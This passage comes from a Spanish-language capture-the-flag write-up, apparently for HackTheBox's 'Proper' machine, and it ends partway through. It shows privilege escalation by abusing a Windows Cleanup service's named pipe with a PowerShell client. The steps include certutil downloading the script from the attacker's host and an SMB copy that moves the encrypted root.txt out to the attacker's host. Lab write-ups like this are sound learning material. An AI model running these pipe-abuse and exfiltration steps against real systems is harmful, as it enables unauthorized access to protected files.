&lt;p&gt;Y viendo el servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; .\server.exe
Error: open \\.\pipe\cleanupPipe: Access is denied.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vale, error al abrir un pipe (entiendo que debe ser un &lt;strong&gt;named pipe&lt;/strong&gt;) llamado &lt;code&gt;cleanupPipe&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un &lt;strong&gt;pipe&lt;/strong&gt; es una secci√≥n de la memoria que los procesos pueden usar para comunicarse entre ellos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/ipc/pipes&quot;&gt;Microsoft Docs - Pipes&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/named-pipe-client-impersonation&quot;&gt;Named Pipes&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si ponemos alg√∫n archivo en la ruta &lt;code&gt;C:\\Users\web\Downloads&lt;/code&gt; y ejecutamos el binario &lt;code&gt;client.exe&lt;/code&gt; no lo borra :(&lt;/p&gt;

&lt;p&gt;Aprovechemos la carpeta compartida que tenemos con &lt;code&gt;smbserver.py&lt;/code&gt; y copiemos los binarios a nuestra m√°quina a ver si podemos obtener m√°s info de ellos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; copy client.exe \\10.10.14.164\smbFolder\client.exe
PS C:\Program Files\Cleanup&amp;gt; copy server.exe \\10.10.14.164\smbFolder\server.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en nuestra m√°quina ya los tendriamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;~/sec/htb/proper/content/files/cleanup ¬∑
‚ù≠ mv ../../../scripts/header/server.exe .
‚ù≠ mv ../../../scripts/header/client.exe .
‚ù≠ ls
client.exe  server.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;cleanup-analysis&quot;&gt;Hacemos an√°lisis din√°mico contra los binarios del proceso &lt;u&gt;Cleanup&lt;/u&gt; &lt;a href=&quot;#cleanup-analysis&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Validando si encontramos algo √∫til, alguna cadena interesante o leakeada, vemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ strings client.exe 
...
main.serviceClean
main.serviceRestore
main.clean
main.restore
main.main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(Validando el inicio de este output, vemos esto: &lt;code&gt;Go build ID: ...&lt;/code&gt;. Es interesante porque podemos pensar desde ya que son binarios hechos en &lt;code&gt;Go&lt;/code&gt;, pueda que sea necesario saberlo.)&lt;/p&gt;

&lt;p&gt;Tenemos lo que deben ser la funciones del programa, que el principal debe ser &lt;code&gt;main.main&lt;/code&gt; y de ah√≠ se van derivando las funcionalidades. Si nos fijamos esta la funci√≥n (eso creemos) &lt;code&gt;cl, pero tambi√©n hay una llamada &lt;/code&gt;restore`, esto esta interesante‚Ä¶ Pero ni idea como ser√° el proceso para llegar a ella.&lt;/p&gt;

&lt;p&gt;Viendo el servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ strings server.exe
...
main.encrypt
main.decrypt
main.handle
main.clean
main.restore
main.createServer
main.main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Jmmm cuenta con m√°s funciones (seguimos creyendo :P), en este caso con dos llamativas, &lt;code&gt;encrypt&lt;/code&gt; y &lt;code&gt;decrypt&lt;/code&gt;, pero ni idea de su funcionamiento‚Ä¶&lt;/p&gt;

&lt;p&gt;En este punto podemos pensar en hacer algo de &lt;strong&gt;reversing&lt;/strong&gt; a ver si logramos entender (o creer entender) que esta haciendo y si podemos aprovecharnos de algo. &lt;strong&gt;Pero antes de hacer esto&lt;/strong&gt;, hagamos un an√°lisis din√°mico, o sea con los programas en ejecuci√≥n a ver si logramos ver algo distinto. Tengo unos problemas con &lt;code&gt;wine&lt;/code&gt;, as√≠ que lo mejor ser√° movernos a una m√°quina virtual &lt;strong&gt;Windows&lt;/strong&gt; para probar los binarios‚Ä¶&lt;/p&gt;

&lt;p&gt;Estando dentro e intentando ejecutar &lt;code&gt;cl, pero sin el servidor (&lt;/code&gt;server.exe`) activo obtenemos el mismo output que antes, pero no se borra nada:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files.png&quot; alt=&quot;321win_trying_clean_files&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si activamos el servidor (necesitas ejecutarlo con permisos de &lt;strong&gt;Administrador&lt;/strong&gt;) y volvemos a intentar tenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_fail.png&quot; alt=&quot;321win_trying_clean_files_with_servON_fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nada. No borra nada‚Ä¶ Despu√©s de jugar un rato, agregando cualquier tipo de archivos, a mano, de internet, etc. Logramos al menos ver un output diferente despu√©s de varios intentos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_clean_files_with_servON_done.png&quot; alt=&quot;321win_trying_clean_files_with_servON_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa vemos que el output del cliente es el mismo, pero en el server obtenemos un &lt;code&gt;CLEAN &amp;lt;path_file&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Bueno al menos tenemos algo distinto, pero es muy raro porque si volvemos a generar ese archivo (&lt;code&gt;.lnk&lt;/code&gt;) o incluso otros, los borraba y obten√≠amos el output `CL, pero al intentarlo de nuevo (para tomar el screen de que algo pasaba :P) no los volv√≠a a borrar :(&lt;/p&gt;

&lt;p&gt;Pero bueno, sabemos que si esta funcionando, raro, pero funcionando‚Ä¶&lt;/p&gt;

&lt;p&gt;Podr√≠amos pensar que el &lt;code&gt;restore&lt;/code&gt; debe ser como un ‚Äúrecuperar lo que se ha borrado‚Äù (creo que tiene l√≥gica).&lt;/p&gt;

&lt;p&gt;Intentando de alguna forma ejecutar el &lt;code&gt;restore&lt;/code&gt; con cosas como:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Borrar y ver si en alg√∫n momento se restauraba autom√°ticamente.&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;client.exe MicrosoftEdge.lnk --restore&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Otras cositas raras‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nada.&lt;/p&gt;

&lt;p&gt;Peeeeeeeeeeeeeeeeeeero si intentamos por ejemplo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;client.exe -R MicrosoftEdge.lnk&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_trying_restore_files.png&quot; alt=&quot;321win_trying_restore_files&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opaaaaa obtenemos en el cliente el mensaje &lt;code&gt;Restoring &amp;lt;file_name&amp;gt;&lt;/code&gt;, y el servidor hace un &lt;code&gt;open&lt;/code&gt; al archivo que solicitamos, pero pasa el nombre a &lt;code&gt;base64&lt;/code&gt; yyyyyyyy adem√°s lo esta buscando sobre la ruta &lt;code&gt;C:\ProgramData\Cleanup&lt;/code&gt;‚Ä¶ Interesantemente extra√±o.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ echo &quot;MicrosoftEdge.lnk&quot; | base64
TWljcm9zb2Z0RWRnZS5sbmsK
‚ù≠ echo &quot;TWljcm9zb2Z0RWRnZS5sbms=&quot; | base64 -d
MicrosoftEdge.lnk
‚ù≠ echo &quot;TWljcm9zb2Z0RWRnZS5sbmsK&quot; | base64 -d
MicrosoftEdge.lnk
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s probando con &lt;code&gt;Reversing&lt;/code&gt; logramos ver la instrucci√≥n &lt;code&gt;-R&lt;/code&gt; (en hex) esperando ser ejecutada, en este caso tuvimos suerte y dimos con la &lt;code&gt;R&lt;/code&gt; sin necesitarlo, pero si no, pues esa parte estar√≠a en el writeup ü§™ (pa que no quede taaaan largo)&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;cleanup-pipe&quot;&gt;Interactuamos con el &lt;u&gt;pipe&lt;/u&gt; que usa &lt;u&gt;Cleanup&lt;/u&gt; &lt;a href=&quot;#cleanup-pipe&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En este punto estuve bastante perdido en el funcionamiento de lo que quer√≠a hacer. Si lo pensamos podemos intuir r√°pidamente que debemos/deber√≠amos intentar, pero el ‚Äúcomo‚Äù fue lo que me estuvo quemando el cerebro (aunque al final es muuuuuuuuuuuuuuuuy sencillo):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Sabemos que borra un archivo y en el servidor llega &lt;code&gt;CLEAN&lt;/code&gt; cuando lo hace.&lt;/li&gt;
  &lt;li&gt;Ese archivo lo quita de la ruta original y lo copia/mueve con un nombre en &lt;strong&gt;base64&lt;/strong&gt; en la ruta &lt;code&gt;C:\ProgramData\Cleanup&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Si queremos hacerle un &lt;code&gt;restore&lt;/code&gt; al archivo, tenemos que pasarle el par√°metro &lt;code&gt;-R&lt;/code&gt; con el nombre del archivo borrado (ruta) en texto plano.&lt;/li&gt;
  &lt;li&gt;Tomara ese texto plano, generara la cadena en &lt;strong&gt;base64&lt;/strong&gt; y la buscara en la ruta &lt;code&gt;C:\ProgramData\Cleanup&lt;/code&gt;, si lo encuentra, lo regenera a la ruta de donde se borr√≥‚Ä¶&lt;/li&gt;
  &lt;li&gt;Entonces podemos buscar alguna manera de indicarle al &lt;code&gt;pipe&lt;/code&gt; &lt;strong&gt;cleanupPipe&lt;/strong&gt; que borre (por ejemplo) el archivo &lt;code&gt;root.txt&lt;/code&gt; (suponemos que esta en &lt;code&gt;C:\\Users\Administrator\Desktop&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;Aprovecharnos de que el archivo queda encriptado en la ruta &lt;code&gt;C:\ProgramData\Cleanup&lt;/code&gt; y ver como podemos restaurarlo para ver su contenido‚Ä¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces, si queremos ‚Äúhablar‚Äù con el &lt;code&gt;pipe&lt;/code&gt; podemos apoyarnos de &lt;strong&gt;PowerShell&lt;/strong&gt;, buscando encontramos algunos recursos para guiarnos en nuestro script:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/31338421/asynchronous-named-pipes-in-powershell-using-callbacks&quot;&gt;stackoverflow - Asynchronous named pipes in &lt;strong&gt;powershell&lt;/strong&gt; using callbacks&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/24096969/powershell-named-pipe-no-connection&quot;&gt;stackoverflow - &lt;strong&gt;PowerShell&lt;/strong&gt; Named Pipe: no connection?&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gbegerow.wordpress.com/tag/powershell-named-pipes/&quot;&gt;&lt;strong&gt;PowerShell&lt;/strong&gt; Named Pipes&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;(Me falta un recurso que se me perdi√≥ (que casualidad üò† :sad:), pero de ah√≠ viene esta parte del writeup)&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Por si se quieren saltar esta parte en la que entendemos como interact√∫a el &lt;code&gt;pipe&lt;/code&gt; con los servicios usando &lt;code&gt;IO Ninja&lt;/code&gt; y, pero que tambi√©n perdemos tiempo con un script, les hice un regalo:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;‚è≥ &lt;a href=&quot;#cleanup-ioninja&quot;&gt;TEST - Usando &lt;strong&gt;IO Ninja&lt;/strong&gt; para entender los procesos que hace el &lt;strong&gt;pipe&lt;/strong&gt; (gracias &lt;strong&gt;&lt;u&gt;4st1nus&lt;/u&gt;&lt;/strong&gt;)&lt;/a&gt;.&lt;br /&gt;
‚åõ &lt;a href=&quot;#cleanup-readfiles&quot;&gt;DONE - Viendo el contenido de cualquier archivo del sistema&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;cleanup-ioninja&quot;&gt;Usando &lt;u&gt;IO Ninja&lt;/u&gt; para ver procesos del &lt;u&gt;pipe&lt;/u&gt; &lt;a href=&quot;#cleanup-ioninja&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;De nuevo, gracias &lt;u&gt;4st1nus&lt;/u&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En el recurso perdido encontramos esta estructura guapetona:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;type writer.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Define el nombre del pipe
$PipeName = 'cleanupPipe'
$PipeDir  = [System.IO.Pipes.PipeDirection]::Out
$PipeOpt  = [System.IO.Pipes.PipeOptions]::Asynchronous

# Ac√° almacena lo que se envia al pipe mediante un input por consola
$Message = Read-Host &quot;Put message to send to pipe&quot;

try {
    # Crea la comunicaci√≥n con el pipe
    $pipeClient = new-object System.IO.Pipes.NamedPipeClientStream('.', $PipeName, $PipeDir, $PipeOpt)
    # Crea el objeto que nos permite enviarle la data al pipe
    $sw = new-object System.IO.StreamWriter($pipeClient)
    $pipeClient.Connect()

    if (!$pipeClient.IsConnected) {
        throw &quot;Failed to connect client to pipe $pipeName&quot;
    }

    $sw.AutoFlush = $true
    # Envia el &quot;mensaje&quot; al pipe
    $sw.WriteLine($Message)
}

catch {
    Write-Host &quot;Error sending pipe message: $_&quot; -ForegroundColor Red
}

finally {
    # Entiendo que limpia las variables y cierra la conexion con el pipe
    if ($sw) {
        $sw.Dispose()
        $sw = $null
    }
    if ($pipeClient) {
        $pipeClient.Dispose()
        $pipeClient = $null
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces, la idea es que al ejecutarlo nos pedir√° algo que ser√° enviado al &lt;strong&gt;Pipe&lt;/strong&gt;, le indicaremos &lt;code&gt;CLEAN C:\algo&lt;/code&gt;, y esto llegara (&lt;strong&gt;&lt;em&gt;ojal√°&lt;/em&gt;&lt;/strong&gt;) al servidor (&lt;code&gt;server.exe&lt;/code&gt;) para ser procesado‚Ä¶&lt;/p&gt;

&lt;p&gt;Generemos un archivo para hacer las pruebas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;echo &quot;a vel&quot; &amp;gt; C:\\Users\Varg\Desktop\aja.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS c:\Program Files\Cleanup&amp;gt; .\writer.ps1
Put message to send to pipe: CLEAN C:\\Users\Varg\Desktop\aja.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos en el servidor un error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;server.exe
CLEAN C:\\Users\Varg\Desktop\aja.txt
: The filename, directory name, or volume label syntax is incorrect.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo cual es muy raro porque estamos colocando la ruta que es‚Ä¶&lt;/p&gt;

&lt;p&gt;AC√Å me perd√≠ completamente, as√≠ que decid√≠ pedir ayuda, ah√≠ apareci√≥ &lt;a href=&quot;https://twitter.com/4st1nus&quot;&gt;4st1nus&lt;/a&gt; (&lt;strong&gt;Gracias de nuevo&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;Me indico que me apoyara de la herramienta &lt;a href=&quot;https://ioninja.com/&quot;&gt;IO Ninja&lt;/a&gt; para ver los procesos que hace el &lt;strong&gt;pipe&lt;/strong&gt;, pero siguiendo la propia descripci√≥n de la web es:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;IO Ninja&lt;/strong&gt; is a professional, scriptable, multi-purpose terminal emulator, sniffer, and protocol analyzer. It‚Äôs aimed at network security experts, system administrators, and all kinds of software/hardware/embedded developers.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Despu√©s de descargarla, para cargar el programa lo hacemos as√≠:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;File&lt;/code&gt; &amp;gt; &lt;code&gt;New Session&lt;/code&gt; &amp;gt; &lt;code&gt;Pipe Monitor&lt;/code&gt; &amp;gt; En la parte de arriba hay un &lt;strong&gt;select&lt;/strong&gt;, escogemos &lt;code&gt;File Name&lt;/code&gt; y escribimos la ruta &lt;code&gt;C:\Program Files\Cleanup\client.exe&lt;/code&gt; &amp;gt; volvemos al &lt;strong&gt;select&lt;/strong&gt; y seleccionamos &lt;code&gt;None&lt;/code&gt; &amp;gt; &lt;code&gt;Apply Filter&lt;/code&gt; &amp;gt; &lt;code&gt;Capture&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;(Hacemos lo mismo para el binario &lt;code&gt;server.exe&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y procedemos a ejecutar de nuevo nuestro script, (prob√© otra cosa para saber que todo fuera oki y en donde encontramos algo extra√±o):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS c:\Program Files\Cleanup&amp;gt; .\writer.ps1
Put message to send to pipe: CLEAN hola
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en el &lt;strong&gt;IO Ninja&lt;/strong&gt; vemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithDots_fail.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Jmmm, algo extra√±o es que le agrega &lt;strong&gt;2 puntos&lt;/strong&gt; al final de la b√∫squeda y ese tiene pinta de ser el problema‚Ä¶&lt;/p&gt;

&lt;p&gt;Despu√©s de un rato probando otras formas de jugar con el script, llegamos a una idea m√°s peque√±a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;type writer.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Nos conectamos al pipe
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(&quot;cleanupPipe&quot;);
$pipe.Connect(); 

# Generamos objeto para interactuar con el pipe
$sw = New-Object System.IO.StreamWriter($pipe);
# Indicamos que borre el archivo que habiamos creado antes como prueba
$sw.Write(&quot;CLEAN C:\\Users\Varg\Downloads\aja.txt&quot;);

# Cerramos objetos
$sw.Dispose(); 
$pipe.Dispose();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo ejecutamos y obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_fail.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aparentemente va todo bien, pero en el servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;server.exe
...
CLEAN C:\\Users\Varg\Downloads\aja.tx
open C:\\Users\Varg\Downloads\aja.tx: The system cannot find the file specified.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora le quita una letraaaaaaaaaaaaaaaaaa ü§£, pero bueno, ac√° es m√°s f√°cil, simplemente agregu√©mosle una al final de la cadena a ver si la interpreta bien:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;...
$sw.Write(&quot;CLEAN C:\\Users\Varg\Downloads\aja.txt.&quot;);
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_cleanWithOutDots_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;c:\Program Files\Cleanup&amp;gt;server.exe
...
CLEAN C:\\Users\Varg\Downloads\aja.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, al menos no nos reporta errores, validando si el archivo se borr√≥ realmente tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; ls C:\\Users\Varg\Downloads\
PS C:\Program Files\Cleanup&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listones, y tambi√©n validemos que se haya generado el archivo encriptado en la ruta &lt;code&gt;C:\ProgramData\Cleanup&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; dir C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM            120 QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==

PS C:\Program Files\Cleanup&amp;gt; type C:\ProgramData\Cleanup\QzpcVXNlcnNcVmFyZ1xEb3dubG9hZHNcYWphLnR4dA==
1d30bfee9a03a2c8e2c9adb66ce895cf5949e2d2406bf0ec66077fc4fe37f6aefd558f64a636570de0db530327936f35e73638155d8f0b56361cb600
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si decodeamos el nombre del archivo obtenemos &lt;code&gt;C:\\Users\Varg\Downloads\aja.txt&lt;/code&gt;, as√≠ que perfecto, ahora hagamos el &lt;strong&gt;restore&lt;/strong&gt; a ver como se procesa apoy√°ndonos de &lt;strong&gt;IO Ninja&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; .\client.exe -R C:\\Users\Varg\Downloads\aja.txt
Restoring C:\\Users\Varg\Downloads\aja.txt
PS C:\Program Files\Cleanup&amp;gt; ls C:\ProgramData\Cleanup\
PS C:\Program Files\Cleanup&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oko, parece que s√≠, validemos el proceso y si lo dejo en su ruta &lt;strong&gt;nativa&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/proper/321win_IO_restorePath_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;OHH, el &lt;strong&gt;restore&lt;/strong&gt; ya lo hace con la cadena decodeada, interesante (adem√°s de que tenemos &lt;code&gt;CLEANER&lt;/code&gt; y &lt;code&gt;RESTORE&lt;/code&gt; para usar en dado caso con nuestro script).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; ls C:\\Users\Varg\Downloads\

    Directory: C:\\Users\Varg\Downloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM             16 aja.txt

PS C:\Program Files\Cleanup&amp;gt; type C:\\Users\Varg\Downloads\aja.txt
a vel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;cleanup-readfiles&quot;&gt;Extraemos cualquier archivo del sistema &lt;a href=&quot;#cleanup-readfiles&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listoooooones, lo hace correctamente, tenemos un script funcional y sabemos como funciona &lt;code&gt;CLEANER&lt;/code&gt; y &lt;code&gt;RESTORE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Con esto en mente, ya podr√≠amos ver el path para extraer archivos como &lt;strong&gt;Administrator&lt;/strong&gt; y aprovecharnos de ellos para ver su contenido, si a√∫n no lo ves, √©chale un poco de cabeza a ver como lo har√≠as e.e&lt;/p&gt;

&lt;p&gt;Listo, ¬øya lo tienes? Entonces‚Ä¶&lt;/p&gt;

&lt;p&gt;Podemos aprovecharnos para extraer por ejemplo el archivo &lt;code&gt;root.txt&lt;/code&gt; as√≠:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Estando en la m√°quina v√≠ctima subimos nuestro script con la l√≠nea &lt;code&gt;$sw.Write(&quot;CLEAN C:\\Users\Administrator\Desktop\root.txt.&quot;);&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Ejecutamos y ver√≠amos en la ruta &lt;code&gt;C:\ProgramData\Cleanup\&lt;/code&gt; el archivo encriptado.&lt;/li&gt;
  &lt;li&gt;Lo tomamos y nos lo pasamos a nuestra VM &lt;strong&gt;Windows&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Lo colocamos en la ruta &lt;code&gt;C:\ProgramData\Cleanup\&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Aprovechamos el uso del &lt;code&gt;RESTORE&lt;/code&gt;, le pasamos la ruta &lt;code&gt;C:\\Users\Administrator\Desktop\root.txt&lt;/code&gt;, como hace la restauraci√≥n en la ruta original, en teor√≠a regenerar√≠a el archivo en el directorio &lt;code&gt;C:\\Users\Administrator\Desktop\&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;D√©mosle‚Ä¶&lt;/p&gt;

&lt;p&gt;Subimos script y ejecutamos, con esto generamos el &lt;code&gt;CLEAN&lt;/code&gt; del archivo &lt;code&gt;root.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\web\Videos&amp;gt; .\certutil.exe -f -urlcache -split http://10.10.14.164:8000/writer.ps1 writer.ps1
PS C:\\Users\web\Videos&amp;gt; type .\writer.ps1
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Nos conectamos al pipe
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(&quot;cleanupPipe&quot;);
$pipe.Connect(); 

# Generamos objeto para interactuar con el pipe
$sw = New-Object System.IO.StreamWriter($pipe);
# Indicamos que borre el archivo
$sw.Write(&quot;CLEAN C:\\Users\Administrator\Desktop\root.txt&quot;);

# Cerramos objetos
$sw.Dispose(); 
$pipe.Dispose();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos y obtenemos el archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\web\Videos&amp;gt; dir C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2021  25:25 PM            192 QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos lo pasamos a nuestra m√°quina, podemos hacer uso de la carpeta compartida:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\web\Videos&amp;gt; copy C:\ProgramData\Cleanup\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0 \\10.10.14.164\smbFolder\QzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, ahora nos lo llevamos a la m√°quina virtual &lt;strong&gt;Windows&lt;/strong&gt; y lo metemos en la ruta &lt;code&gt;C:\ProgramData\Cleanup\&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Program Files\Cleanup&amp;gt; ls C:\ProgramData\Cleanup\

    Directory: C:\ProgramData\Cleanup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
